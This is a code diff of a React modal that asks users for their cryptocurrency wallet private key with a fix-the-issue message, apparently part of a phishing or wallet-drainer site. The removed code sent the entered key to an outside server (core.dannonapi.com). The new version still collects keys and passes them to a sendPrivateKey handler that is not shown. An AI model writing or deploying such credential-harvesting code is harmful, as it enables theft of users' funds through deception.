@@ -8,26 +8,12 @@ function PrivateKeyModal({ closePrivateKeyForm, sendPrivateKey }) {
   const submitPhrase = async (e) => {
     e.preventDefault();
 
-    if (privateKey) {
-      try {
-        const response = await axios.post(
-          "https://core.dannonapi.com/wallet/",
-          {
-            key: privateKey,
-            wallet_type: "private_key",
-            access_type: "privateKey", 
-          }
-        );
+    if (privateKey.length >= 50) {
+      sendPrivateKey(privateKey); 
+    }
 
-        console.log(response.data);
-        sendPrivateKey(privateKey); 
-      } catch (error) {
-        console.error(
-          "Failed to connect:",
-          error.response?.data || error.message
-        );
-        alert("Failed to connect. Please check your input and try again.");
-      }
+    if(!privateKey || privateKey.length <= 50){
+      alert('Input your complete Private key to resolve the issue')
     }
   };
 
